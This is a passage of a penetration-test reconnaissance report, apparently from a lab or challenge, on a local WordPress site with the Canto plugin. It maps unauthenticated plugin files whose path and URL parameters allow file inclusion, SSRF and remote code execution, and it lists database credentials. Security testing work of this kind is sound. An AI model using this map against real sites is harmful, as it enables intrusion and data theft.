# Reconnaissance Deliverable

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls - understand what each guard means before analyzing vulnerabilities.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates, then vertical escalation endpoints for each role level, finally context-based workflow bypasses.

## 1. Executive Summary

This WordPress 6.5.4 application running on Apache 2.4.41 (Ubuntu) presents a **CRITICAL security posture** requiring immediate remediation. The application follows a traditional monolithic LAMP stack architecture deployed in a single Docker container at http://localhost:35995. The core WordPress installation is relatively secure with proper use of prepared statements and password hashing, but the **Canto Digital Asset Management (DAM) plugin v3.0.4** introduces multiple critical vulnerabilities.

**Core Technology Stack:**
- **Frontend:** WordPress 6.5.4 with "Rock Tune" theme
- **Backend:** PHP 7.4 (end-of-life) with Apache 2.4.41
- **Database:** MySQL 8.0.37 (same container)
- **Infrastructure:** Single Docker container, HTTP only (no TLS)
- **Critical Plugin:** Canto DAM v3.0.4 with OAuth 2.0 integration

**Most Critical Findings:**

The Canto plugin exposes **six directly-accessible PHP files** that bypass WordPress authentication entirely and accept user-controlled file paths via `wp_abspath` and `abspath` parameters. Combined with the intentionally enabled `allow_url_include=On` PHP configuration, these vulnerabilities create a direct path to **Remote Code Execution (RCE)**. Additionally, the same files contain **Server-Side Request Forgery (SSRF)** vulnerabilities allowing attackers to probe internal networks, access cloud metadata endpoints, and exfiltrate sensitive data.

**Attack Surface Summary:**

The application exposes 21+ network-accessible entry points including:
- WordPress core authentication endpoints (wp-login.php, password reset, logout)
- Admin area (requires authentication, redirects to login)
- REST API endpoints (user enumeration possible)
- XML-RPC interface (brute force vector)
- **6 unauthenticated Canto plugin library files (CRITICAL vulnerabilities)**
- Multiple AJAX handlers (some missing authorization checks)

The primary attack vector requires **no authentication** - attackers can directly access plugin library files at URLs like `/wp-content/plugins/canto/includes/lib/get.php` to exploit Local File Inclusion (LFI), SSRF, and achieve RCE.

**Security Posture Assessment:**

Defense-in-depth has failed at multiple layers:
- **Network Layer:** No TLS encryption, no WAF protection
- **Perimeter Layer:** Unauthenticated access to vulnerable plugin endpoints with no input validation
- **Application Layer:** WordPress core security (nonces, prepared statements) properly implemented, but plugin completely bypasses these controls
- **Data Layer:** Database credentials stored in plaintext, no encryption at rest

**Overall Assessment:** **INADEQUATE** - Immediate action required before any production exposure.

## 2. Technology & Service Map

### Frontend
- **Framework:** WordPress 6.5.4 CMS
- **Theme:** Rock Tune (music industry theme)
- **JavaScript Libraries:** jQuery 3.7.0, jQuery Migrate 3.4.1
- **Authentication UI:** WordPress default login interface at /wp-login.php
- **Key Features:** Music blog with artist profiles, news articles, audio playlists

### Backend
- **Language:** PHP 7.4.33 (end-of-life since November 2022)
- **Framework:** WordPress 6.5.4 core
- **Web Server:** Apache 2.4.41 (Ubuntu)
- **Server API:** Apache 2.0 Handler (mod_php)
- **Key Libraries:** 
  - PHPass for password hashing
  - WordPress HTTP API (WP_HTTP class)
  - Canto plugin for Digital Asset Management
- **Critical Configuration:** `allow_url_include=On` (enables RFI attacks)

### Infrastructure
- **Hosting:** Docker container (single monolithic container)
- **Container Network:** custom_network bridge (172.133.0.10/16)
- **Database:** MySQL 8.0.37 (localhost:3306, same container)
- **Process Manager:** supervisord (manages Apache + MySQL)
- **TLS/SSL:** NOT CONFIGURED (HTTP only on port 35995)
- **CDN:** None
- **WAF:** None
- **Load Balancer:** None

### Identified Subdomains
- No subdomains discovered (single-host deployment on localhost)
- External OAuth integration with oauth.canto.com:443

### Open Ports & Services
From nmap scan (localhost):
- **Port 35995/tcp:** Apache httpd (WordPress application) - **PRIMARY TARGET**
- **Port 80/tcp:** Caddy httpd (reverse proxy/redirect)
- **Port 443/tcp:** SSL/HTTPS (Caddy)
- **Port 5003/tcp:** Werkzeug httpd 3.0.3 (Python 3.8.17) - OUT OF SCOPE (separate application)
- **Port 5004/tcp:** Werkzeug httpd 3.0.6 (Python 3.8.17) - OUT OF SCOPE (separate application)
- **Port 631/tcp:** CUPS 2.3 (printer service) - OUT OF SCOPE
- **Port 7777/tcp:** SimpleHTTPServer 0.6 (Python 3.12.10) - OUT OF SCOPE
- **Port 9999/tcp:** Unknown service - OUT OF SCOPE
- **Port 49158/tcp:** Golang net/http (Tailscale) - OUT OF SCOPE

**Note:** Only port 35995 is in scope for this penetration test (WordPress application).

## 3. Authentication & Session Management Flow

### Entry Points

**Primary Authentication Endpoints:**
- **POST /wp-login.php** - Main login form (username/email + password)
- **GET /wp-login.php?action=lostpassword** - Password reset request form
- **POST /wp-login.php?action=lostpassword** - Password reset email submission
- **GET /wp-login.php?action=resetpass** - Password reset form with key
- **POST /wp-login.php?action=resetpass** - New password submission
- **GET /wp-login.php?action=logout** - Logout with nonce verification
- **POST /wp-login.php?action=register** - User registration (DISABLED in this installation)

**OAuth Entry Points (Canto Plugin):**
- **Authorization:** `https://oauth.canto.com:443/oauth/api/oauth2/authorize`
- **Callback:** `/wp-admin/options-general.php?page=canto_settings` (receives token, refreshToken, domain, app_api parameters)

### Mechanism

**Step 1: Credential Submission**
- User submits credentials via POST to /wp-login.php with parameters `log` (username/email) and `pwd` (password)
- File: `/app/html/wp-login.php` lines 1497-1546
- WordPress core validates form inputs and prepares authentication

**Step 2: Password Verification**
- Function: `wp_check_password()` at `/app/html/wp-includes/pluggable.php` line 2572
- Uses PHPass library (bcrypt-inspired algorithm) with portable mode
- Password hashes stored in `wp_users.user_pass` column
- Hash format: `$P$B[rounds][salt][hash]` where rounds=8 (256 iterations)
- **Security:** Timing-safe comparison to prevent timing attacks
- **Auto-rehashing:** If old MD5 hash detected, automatically upgrades to bcrypt (lines 2599-2608)

**Step 3: Session Token Generation**
- Function: `WP_Session_Tokens::create()` at `/app/html/wp-includes/class-wp-session-tokens.php` line 150
- Generates 43-character random alphanumeric token using `wp_generate_password(43, true, true)`
- Token is cryptographically secure (uses `wp_rand()` with OpenSSL random bytes)
- Token stored as SHA-256 hash in `wp_usermeta` table with meta_key='session_tokens'
- Includes expiration timestamp, user agent, IP address, and login timestamp in session metadata

**Step 4: Authentication Cookie Creation**
- Function: `wp_set_auth_cookie()` at `/app/html/wp-includes/pluggable.php` lines 1005-1098
- Creates HMAC-signed cookie with format: `username|expiration|token|hmac`
- HMAC computed using site secret keys (AUTH_KEY, SECURE_AUTH_KEY from wp-config.php)
- HMAC algorithm: HMAC-SHA256 of user login + password fragment + expiration + token
- Lines 870-874 show HMAC generation: `hash_hmac('sha256', $data, $key)`

**Step 5: Cookie Setting with Security Flags**
- File: `/app/html/wp-includes/pluggable.php` lines 1093-1097
- **Three cookies set:**
  1. `wordpress_[hash]` (AUTH_COOKIE) - For PLUGINS_COOKIE_PATH
  2. `wordpress_[hash]` (AUTH_COOKIE) - For ADMIN_COOKIE_PATH
  3. `wordpress_logged_in_[hash]` (LOGGED_IN_COOKIE) - For COOKIEPATH
- **Cookie Flags:**
  - HttpOnly: ✅ **TRUE** (prevents JavaScript access)
  - Secure: ⚠️ **DYNAMIC** (only true if accessed via HTTPS, currently FALSE for HTTP-only deployment)
  - SameSite: ❌ **NOT SET** (CRITICAL CSRF vulnerability)
- **Expiration:** 2 days (default) or 14 days (with Remember Me checkbox)

**Step 6: Request Authentication on Subsequent Requests**
- Every request loads user session via `wp_get_current_user()`
- Cookie parsed and HMAC verified
- Session token validated against database (SHA-256 hash comparison)
- User capabilities loaded from `wp_usermeta` table (meta_key='wp_capabilities')

**Step 7: Logout**
- GET/POST to `/wp-login.php?action=logout` with nonce token
- Verifies nonce via `check_admin_referer('log-out')` (line 789 in wp-login.php)
- Destroys session token in database
- Clears all authentication cookies across multiple paths

### Code Pointers

**Authentication Core Files:**
- `/app/html/wp-login.php` - Main authentication interface (1636 lines)
- `/app/html/wp-includes/pluggable.php` - Password hashing (line 2536), cookie handling (lines 857-1098)
- `/app/html/wp-includes/class-wp-session-tokens.php` - Session token management (lines 123-177)
- `/app/html/wp-includes/user.php` - User authentication logic (lines 106-447)
- `/app/html/wp-includes/capabilities.php` - Authorization capability mapping (lines 44-1048)

**OAuth Implementation (Canto Plugin):**
- `/app/html/wp-content/plugins/canto/includes/class-canto-settings.php`
  - State generation: line 276
  - OAuth callback: lines 482-513
  - Token storage: lines 487-491
  - **CRITICAL VULNERABILITY:** No state parameter validation (OAuth CSRF)

### 3.1 Role Assignment Process

**Role Determination:**
- Roles assigned post-authentication via database lookup
- Storage: `wp_usermeta` table with meta_key='wp_capabilities'
- Format: Serialized PHP array like `a:1:{s:13:"administrator";b:1;}`
- Query: `SELECT meta_value FROM wp_usermeta WHERE user_id = %d AND meta_key = 'wp_capabilities'`

**Default Role:**
- New users receive "Subscriber" role (if registration were enabled)
- Default role configurable via Settings > General > New User Default Role
- Current setting: Subscriber (lowest privilege level)

**Role Upgrade Path:**
- **Administrator-initiated:** Admin navigates to Users > All Users, edits user, changes role dropdown
- **Self-service:** NOT AVAILABLE (requires administrator)
- **Automatic:** No automatic role upgrades implemented
- **Code location:** Role changes processed via `/wp-admin/user-edit.php` with `promote_users` capability check

**Code Implementation:**
- Role assignment: `/app/html/wp-admin/includes/user.php` function `edit_user()`
- Role validation: `/app/html/wp-includes/class-wp-user.php` lines 506-527 (`get_role_caps()`)
- Default role constant: `/app/html/wp-includes/default-constants.php` line 355

### 3.2 Privilege Storage & Validation

**Storage Location:**
- **Primary:** `wp_usermeta` table, meta_key='wp_capabilities'
- **Format:** Serialized PHP array mapping role name to boolean
- **Example:** `a:1:{s:13:"administrator";b:1;}` for admin user
- **NOT stored in JWT** - WordPress does not use JWT for standard auth
- **NOT stored in session cookies** - only username and token hash in cookies

**Validation Points:**
- **Every Request:** User capabilities loaded via `WP_User::get_role_caps()` 
- **File:** `/app/html/wp-includes/class-wp-user.php` lines 506-527
- **Process:** Reads wp_capabilities from usermeta, merges with role definition from wp_user_roles option
- **Caching:** Capabilities cached in `WP_User` object for request lifetime, not persisted across requests

**Primary Validation Function:**
- `current_user_can($capability)` at `/app/html/wp-includes/capabilities.php`
- Maps meta capabilities (e.g., 'edit_post') to primitive capabilities (e.g., 'edit_posts' or 'edit_others_posts')
- Function `map_meta_cap()` at line 44-1048 handles context-aware capability mapping
- Example: Editing own post requires 'edit_posts', editing others' requires 'edit_others_posts'

**Cache/Session Persistence:**
- **Request-level cache:** User object persists in `$GLOBALS['wp_current_user']` for single request
- **No cross-request cache:** Capabilities loaded fresh from database on every request
- **Session cookies:** Only contain username + expiration + token + HMAC (NOT capabilities)
- **Why:** Prevents privilege escalation via cookie manipulation; roles always authoritative from database

**Code Pointers:**
- Capability loading: `/app/html/wp-includes/class-wp-user.php` lines 506-527
- Capability checking: `/app/html/wp-includes/capabilities.php` lines 44-1048 (map_meta_cap)
- Admin redirect: `/app/html/wp-admin/admin.php` line 99 (auth_redirect())

### 3.3 Role Switching & Impersonation

**Impersonation Features:**
- **Core WordPress:** NO built-in admin impersonation
- **Canto Plugin:** NO impersonation features found
- **Third-party plugins:** None installed

**Role Switching:**
- **Temporary Privilege Elevation:** NOT IMPLEMENTED
- **Sudo Mode:** NOT IMPLEMENTED
- **Multi-role Assignment:** WordPress supports multiple roles per user (uncommon usage)
- **Code location:** Users can only have capabilities from assigned role(s)

**Audit Trail:**
- **Role Changes:** NOT LOGGED by default WordPress
- **Login Events:** NOT LOGGED (only Apache access logs)
- **Capability Checks:** NOT LOGGED
- **Third-party logging:** None installed

**Code Implementation:**
- No impersonation code found in codebase
- If implemented by plugin, would typically use `wp_set_current_user()` function
- WordPress core: `/app/html/wp-includes/pluggable.php` line 1913 (`wp_set_current_user()`)

## 4. API Endpoint Inventory

**Network Surface Focus:** Only network-accessible API endpoints reachable through the target web application at http://localhost:35995.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|--------------|---------------|----------------------|------------------------|----------------------------|
| **CRITICAL UNAUTHENTICATED ENDPOINTS (Canto Plugin)** |
| GET/POST | `/wp-content/plugins/canto/includes/lib/get.php` | **anon** | album, keyword | **NONE** | Search/list Canto media. **LFI via wp_abspath param (line 5). SSRF via subdomain/app_api (lines 31-43).** See `/app/html/wp-content/plugins/canto/includes/lib/get.php` |
| GET/POST | `/wp-content/plugins/canto/includes/lib/download.php` | **anon** | id | **NONE** | Download Canto media. **LFI via wp_abspath param (line 5). SSRF via subdomain/app_api (line 15).** See `/app/html/wp-content/plugins/canto/includes/lib/download.php` |
| GET/POST | `/wp-content/plugins/canto/includes/lib/detail.php` | **anon** | id | **NONE** | Fetch Canto media details. **LFI via wp_abspath param (line 3). SSRF via subdomain/app_api (line 13).** See `/app/html/wp-content/plugins/canto/includes/lib/detail.php` |
| GET/POST | `/wp-content/plugins/canto/includes/lib/tree.php` | **anon** | ablumid | **NONE** | Browse Canto folder tree. **LFI via wp_abspath param (line 5). SSRF via subdomain/app_api (lines 15-17).** See `/app/html/wp-content/plugins/canto/includes/lib/tree.php` |
| GET/POST | `/wp-content/plugins/canto/includes/lib/sizes.php` | **anon** | None | **NONE** | Get WordPress image sizes. **LFI via abspath param (lines 15, 18).** See `/app/html/wp-content/plugins/canto/includes/lib/sizes.php` |
| POST | `/wp-content/plugins/canto/includes/lib/copy-media.php` | user (weak check) | fbc_id, post_id | Bearer Token + weak auth | Copy media from Canto to WordPress. **LFI via abspath param (lines 55, 58). SSRF via fbc_flight_domain/fbc_app_api (lines 86-91).** See `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php` |
| **AUTHENTICATION ENDPOINTS** |
| GET | `/wp-login.php` | anon | None | None | Display login form. See `/app/html/wp-login.php` |
| POST | `/wp-login.php` | anon | None | None | Submit login credentials (log, pwd params). Handles authentication. See `/app/html/wp-login.php` lines 1497-1546 |
| GET | `/wp-login.php?action=logout` | user | None | Nonce token (check_admin_referer) | Logout user, destroy session. See `/app/html/wp-login.php` lines 788-822 |
| GET | `/wp-login.php?action=lostpassword` | anon | None | None | Display password reset form. See `/app/html/wp-login.php` lines 824-924 |
| POST | `/wp-login.php?action=lostpassword` | anon | None | None | Submit password reset request (user_login param). See `/app/html/wp-login.php` lines 824-924 |
| GET | `/wp-login.php?action=resetpass` | anon | key, login params required | Reset key validation | Display new password form. See `/app/html/wp-login.php` lines 926-1088 |
| POST | `/wp-login.php?action=resetpass` | anon | key, login params required | Reset key validation | Submit new password. See `/app/html/wp-login.php` lines 926-1088 |
| POST | `/wp-login.php?action=postpass` | anon | None | None | Submit password for password-protected post. See `/app/html/wp-login.php` lines 755-786 |
| **WORDPRESS ADMIN AREA** |
| GET/POST | `/wp-admin/*` | user (minimum) | Varies | auth_redirect() + capability checks | Admin dashboard and management pages. See `/app/html/wp-admin/admin.php` line 99 |
| POST | `/wp-admin/admin-ajax.php` | Varies by action | Varies | Action-specific hooks | AJAX request dispatcher. See `/app/html/wp-admin/admin-ajax.php` |
| POST | `/wp-admin/admin-post.php` | user | Varies | Action-specific hooks | POST request handler. See `/app/html/wp-admin/admin-post.php` |
| **CANTO PLUGIN AJAX ENDPOINTS (via admin-ajax.php)** |
| POST | `/wp-admin/admin-ajax.php?action=fbc_get_token` | user | None | wp_ajax_ prefix (weak) | Obtain OAuth token from Canto API. **Missing capability check.** See `/app/html/wp-content/plugins/canto/includes/class-canto.php` line 210 |
| POST | `/wp-admin/admin-ajax.php?action=fbc_getMetadata` | user | fbc_id | Nonce validation + wp_ajax_ | Fetch Canto media metadata. See `/app/html/wp-content/plugins/canto/includes/class-canto.php` line 212 (handler at line 349) |
| POST | `/wp-admin/admin-ajax.php?action=updateOptions` | user | None | wp_ajax_ prefix (weak) | Update Canto plugin settings. **Missing capability check (should require manage_options).** See `/app/html/wp-content/plugins/canto/includes/class-canto.php` line 214 (handler at line 478) |
| POST | `/wp-admin/admin-ajax.php?action=fbc_updateOptions` | user | None | wp_ajax_ prefix (weak) | Update Canto plugin settings (duplicate). **Missing capability check.** See `/app/html/wp-content/plugins/canto/includes/class-canto-settings.php` line 69 |
| **WORDPRESS REST API (Not accessible - 404 errors observed)** |
| GET | `/wp-json/` | anon | None | None | REST API discovery endpoint. **Returns 404 in current deployment.** |
| GET | `/wp-json/wp/v2/posts` | anon (read), user (write) | None | Permission callbacks | List posts. **Returns 404 in current deployment.** |
| GET | `/wp-json/wp/v2/users` | anon (limited data) | None | Permission callbacks | User enumeration. **Returns 404 in current deployment.** |
| **OTHER WORDPRESS CORE ENDPOINTS** |
| GET | `/` or `/index.php` | anon | None | None | WordPress front-end homepage. See `/app/html/index.php` |
| POST | `/xmlrpc.php` | anon/varies | Varies | Method-specific | XML-RPC API (legacy, brute force vector). See `/app/html/xmlrpc.php` |
| GET/POST | `/wp-cron.php` | anon | doing_wp_cron param | None | Pseudo-cron for scheduled tasks. See `/app/html/wp-cron.php` |
| POST | `/wp-comments-post.php` | anon | comment_post_ID | None | Submit blog comment. See `/app/html/wp-comments-post.php` |
| POST | `/wp-trackback.php` | anon | tb_id | None | Trackback/pingback receiver. See `/app/html/wp-trackback.php` |

**Note on REST API:** During live testing, all `/wp-json/*` endpoints returned 404 errors, indicating the REST API may be disabled or misconfigured in this deployment. The pre-recon analysis indicates REST API code exists in WordPress core, but it is not network-accessible in the current configuration.

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** Only input vectors accessible through the target web application's network interface at http://localhost:35995.

### URL Parameters

**Canto Plugin Library Files (CRITICAL - User-Controlled File Inclusion):**
- `wp_abspath` - `/app/html/wp-content/plugins/canto/includes/lib/get.php:5` (require_once)
- `wp_abspath` - `/app/html/wp-content/plugins/canto/includes/lib/download.php:5` (require_once)
- `wp_abspath` - `/app/html/wp-content/plugins/canto/includes/lib/detail.php:3` (require_once)
- `wp_abspath` - `/app/html/wp-content/plugins/canto/includes/lib/tree.php:5` (require_once)
- `abspath` - `/app/html/wp-content/plugins/canto/includes/lib/sizes.php:15` (require_once with urldecode)
- `abspath` - `/app/html/wp-content/plugins/canto/includes/lib/sizes.php:18` (require_once)

**Canto Plugin Library Files (SSRF - User-Controlled URL Construction):**
- `subdomain` - `/app/html/wp-content/plugins/canto/includes/lib/get.php:8` (concatenated into API URL at lines 31-43)
- `app_api` - `/app/html/wp-content/plugins/canto/includes/lib/get.php:9` (concatenated into API URL at lines 31-43)
- `subdomain` - `/app/html/wp-content/plugins/canto/includes/lib/download.php:7` (concatenated into API URL at line 15)
- `app_api` - `/app/html/wp-content/plugins/canto/includes/lib/download.php:8` (concatenated into API URL at line 15)
- `subdomain` - `/app/html/wp-content/plugins/canto/includes/lib/detail.php:6` (concatenated into API URL at line 13)
- `app_api` - `/app/html/wp-content/plugins/canto/includes/lib/detail.php:7` (concatenated into API URL at line 13)
- `subdomain` - `/app/html/wp-content/plugins/canto/includes/lib/tree.php:8` (concatenated into API URL at lines 15-17)
- `app_api` - `/app/html/wp-content/plugins/canto/includes/lib/tree.php:9` (concatenated into API URL at lines 15-17)

**Canto Plugin Search/Pagination Parameters:**
- `album` - `/app/html/wp-content/plugins/canto/includes/lib/get.php:10` (API parameter)
- `keyword` - `/app/html/wp-content/plugins/canto/includes/lib/get.php:14` (search term, URL-encoded)
- `limit` - `/app/html/wp-content/plugins/canto/includes/lib/get.php:11` (pagination)
- `start` - `/app/html/wp-content/plugins/canto/includes/lib/get.php:12` (pagination offset)
- `id` - `/app/html/wp-content/plugins/canto/includes/lib/download.php:9` (media ID)
- `quality` - `/app/html/wp-content/plugins/canto/includes/lib/download.php:10` (download quality)
- `token` - `/app/html/wp-content/plugins/canto/includes/lib/get.php:13` (Bearer token for Authorization header)
- `scheme` - `/app/html/wp-content/plugins/canto/includes/lib/detail.php:8` (resource type)
- `id` - `/app/html/wp-content/plugins/canto/includes/lib/detail.php:9` (media ID)
- `ablumid` - `/app/html/wp-content/plugins/canto/includes/lib/tree.php:10` (album ID)

**Canto Plugin Settings Page (OAuth Callback Parameters):**
- `tab` - `/app/html/wp-content/plugins/canto/includes/class-canto-settings.php:164-165` (settings tab navigation)
- `token` - `/app/html/wp-content/plugins/canto/includes/class-canto-settings.php:483` (OAuth access token from callback)
- `domain` - `/app/html/wp-content/plugins/canto/includes/class-canto-settings.php:484` (Canto subdomain from callback)
- `refreshToken` - `/app/html/wp-content/plugins/canto/includes/class-canto-settings.php:485` (OAuth refresh token)
- `expiresIn` - `/app/html/wp-content/plugins/canto/includes/class-canto-settings.php:486` (token expiration)
- `app_api` - `/app/html/wp-content/plugins/canto/includes/class-canto-settings.php:487` (API domain)
- `disconnect` - `/app/html/wp-content/plugins/canto/includes/class-canto-settings.php:460` (trigger OAuth disconnect)

**WordPress Authentication:**
- `redirect_to` - `/wp-login.php` (post-login redirect URL, potential open redirect)
- `action` - `/wp-login.php` (controls auth flow: login, logout, lostpassword, resetpass)
- `key` - `/wp-login.php?action=resetpass` (password reset key validation)
- `login` - `/wp-login.php?action=resetpass` (username for password reset)

**WordPress Admin:**
- `page` - `/wp-admin/admin.php` (admin page dispatcher)
- `post_id` - `/app/html/wp-content/plugins/canto/includes/lib/class-canto-media.php:45` (WordPress post ID)

### POST Body Fields (JSON/Form)

**WordPress Authentication:**
- `log` - `/wp-login.php` (username or email for login)
- `pwd` - `/wp-login.php` (password for login)
- `rememberme` - `/wp-login.php` (Remember Me checkbox, extends session)
- `user_login` - `/wp-login.php?action=lostpassword` (username/email for password reset)
- `pass1` - `/wp-login.php?action=resetpass` (new password field 1)
- `pass2` - `/wp-login.php?action=resetpass` (new password field 2 confirmation)
- `post_password` - `/wp-login.php?action=postpass` (password for protected posts)

**Canto Plugin AJAX Handlers:**
- `fbc_id` - `/app/html/wp-content/plugins/canto/includes/class-canto.php:354` (getMetadata() - Canto media ID)
- `nonce` - `/app/html/wp-content/plugins/canto/includes/class-canto.php:351` (CSRF token validation)
- `duplicates` - `/app/html/wp-content/plugins/canto/includes/class-canto.php:480` (updateOptions() - duplicate detection setting)
- `cron` - `/app/html/wp-content/plugins/canto/includes/class-canto.php:481` (updateOptions() - enable/disable scheduled updates)
- `schedule` - `/app/html/wp-content/plugins/canto/includes/class-canto.php:489` (updateOptions() - cron schedule frequency)
- `cron_time_day` - `/app/html/wp-content/plugins/canto/includes/class-canto.php:490` (updateOptions() - day for weekly schedule)
- `cron_time_hour` - `/app/html/wp-content/plugins/canto/includes/class-canto.php:491` (updateOptions() - hour for daily schedule)

**Canto Plugin Media Copy (POST to copy-media.php):**
- `abspath` - `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:55` (user-controlled path for require_once)
- `abspath` - `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:58` (second require_once)
- `fbc_app_token` - `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:35` (OAuth access token)
- `fbc_flight_domain` - `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:70` (Canto subdomain, SSRF vector at line 86)
- `fbc_app_api` - `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:71` (API domain, SSRF vector at line 86)
- `fbc_id` - `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:66` (Canto media ID)
- `fbc_scheme` - `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:67` (media scheme: image/video/document)
- `post_id` - `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:69` (target WordPress post ID)
- `description` - `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:62` (post content/description)
- `title` - `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:74` (post title)
- `alt` - `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:63` (image alt text)
- `caption` - `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:72` (image caption)
- `copyright` - `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:64` (copyright metadata)

**WordPress Comment Submission:**
- `comment` - `/wp-comments-post.php` (comment text content)
- `author` - `/wp-comments-post.php` (commenter name)
- `email` - `/wp-comments-post.php` (commenter email)
- `url` - `/wp-comments-post.php` (commenter website URL)
- `comment_post_ID` - `/wp-comments-post.php` (post ID for comment)

### HTTP Headers

**Canto Plugin Settings (Used in OAuth Redirects):**
- `Host` (via `$_SERVER['HTTP_HOST']`) - `/app/html/wp-content/plugins/canto/includes/class-canto-settings.php:274` (OAuth redirect URL construction)
- `X-Forwarded-Proto` or HTTPS detection (via `$_SERVER['HTTPS']`) - `/app/html/wp-content/plugins/canto/includes/class-canto-settings.php:272` (scheme detection for redirects)

**WordPress Core:**
- `Authorization` - WordPress REST API (if enabled) for Bearer token authentication
- `User-Agent` - Stored in session metadata (not used for authorization decisions)
- `X-Forwarded-For` - Not explicitly processed by WordPress core or Canto plugin

**Note:** WordPress does not explicitly process custom headers in the Canto plugin or core files for security-sensitive operations.

### Cookie Values

**WordPress Authentication Cookies (Set by Core):**
- `wordpress_[hash]` - Authentication cookie (PLUGINS_COOKIE_PATH and ADMIN_COOKIE_PATH)
- `wordpress_sec_[hash]` - Secure authentication cookie (for HTTPS, not used in HTTP-only deployment)
- `wordpress_logged_in_[hash]` - Logged-in status cookie (COOKIEPATH)
- Format: `username|expiration|token|hmac`
- Set at: `/app/html/wp-includes/pluggable.php:1093-1097`

**Note:** The Canto plugin does not read or set any custom cookies. WordPress core handles all authentication cookie processing. No `$_COOKIE` usage found in Canto plugin code.

### File Uploads

**WordPress Media Upload:**
- `async-upload` - WordPress core async file upload via `/wp-admin/async-upload.php`
- Requires `upload_files` capability
- Validated via `wp_check_filetype_and_ext()` in `/wp-includes/functions.php`

**Canto Plugin:**
- **No direct file upload inputs** - Plugin downloads files from Canto API using `download_url()` and imports via `media_handle_sideload()`
- File download endpoint: `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:111` (download_url())
- File import: `/app/html/wp-content/plugins/canto/includes/lib/copy-media.php:203` (media_handle_sideload())

## 6. Network & Interaction Map

**Network Surface Focus:** Only components of the deployed, network-accessible infrastructure reachable through http://localhost:35995.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| Public Internet | ExternAsset | Internet | N/A | Public | External network |
| WordPress Application | Service | App | PHP 7.4/Apache 2.4.41 | PII, Tokens, Secrets | Main WordPress 6.5.4 application at port 35995 |
| MySQL Database | DataStore | Data | MySQL 8.0.37 | PII, Tokens, Secrets | Stores user data, sessions, OAuth tokens (same container as WordPress) |
| Canto OAuth Service | ThirdParty | Internet | OAuth 2.0 | Tokens | External OAuth provider at oauth.canto.com:443 |
| Canto DAM API | ThirdParty | Internet | REST API | Public | External Digital Asset Management API at *.canto.com |
| WordPress Admin Interface | Service | App | WordPress Core | PII, Tokens | Admin dashboard and management pages |
| WordPress REST API | Service | App | WordPress Core | Public, PII | REST API endpoints (currently returns 404) |
| Canto Plugin Library Files | Service | App | PHP 7.4 (Vulnerable) | Tokens, Secrets | 6 unauthenticated PHP files with LFI/SSRF vulnerabilities |
| XML-RPC Endpoint | Service | App | WordPress Core | Public | Legacy XML-RPC API at /xmlrpc.php |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| WordPress Application | Hosts: `http://localhost:35995`; Endpoints: `/`, `/wp-login.php`, `/wp-admin/*`, `/wp-content/plugins/canto/includes/lib/*`; Auth: Session Cookies (wordpress_[hash]); Dependencies: MySQL Database, Canto OAuth Service, Canto DAM API; Container: Docker (172.133.0.10/16) |
| MySQL Database | Engine: `MySQL 8.0.37`; Exposure: `localhost:3306 only`; Consumers: `WordPress Application`; Credentials: `wp_user` / `ThisIsNotPartOfTheChallenge!` (plaintext in wp-config.php); Tables: `wp_users`, `wp_usermeta`, `wp_posts`, `wp_options`, `wp_comments` (11 core tables) |
| Canto OAuth Service | Issuer: `oauth.canto.com:443`; Protocol: `OAuth 2.0 Authorization Code Flow`; Token Format: `Bearer Token (opaque)`; Endpoints: `/oauth/api/oauth2/authorize`, `/oauth/rest/oauth2/authenticate`; Vulnerabilities: `State parameter not validated (CSRF)` |
| Canto DAM API | Hosts: `https://{subdomain}.{app_api}/api/v1/`; Domains: `canto.com, canto.global, canto.de, ca.canto.com`; Auth: `Bearer Token`; Consumers: `Canto Plugin`; Vulnerabilities: `User-controllable subdomain/app_api enables SSRF` |
| WordPress Admin Interface | Access: `/wp-admin/*`; Auth: `auth_redirect() at line 99 of admin.php`; Capabilities: Role-based (Administrator, Editor, Author, Contributor, Subscriber); Protected: `Yes (redirects to wp-login.php if not authenticated)` |
| Canto Plugin Library Files | Files: `get.php, download.php, detail.php, tree.php, sizes.php, copy-media.php`; Path: `/wp-content/plugins/canto/includes/lib/`; Auth: `NONE (directly accessible)` ; Vulnerabilities: `LFI via wp_abspath/abspath params, SSRF via subdomain/app_api params, RCE via allow_url_include=On` |
| XML-RPC Endpoint | File: `/xmlrpc.php`; Methods: `Multiple XML-RPC methods`; Auth: `Varies by method`; Vulnerabilities: `Brute force amplification via system.multicall, pingback DDoS` |
| WordPress REST API | Base: `/wp-json/`; Status: `Returns 404 (disabled or misconfigured)`; Endpoints: `/wp/v2/posts`, `/wp/v2/users`, `/wp/v2/media`; Note: `Code exists but not accessible in current deployment` |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
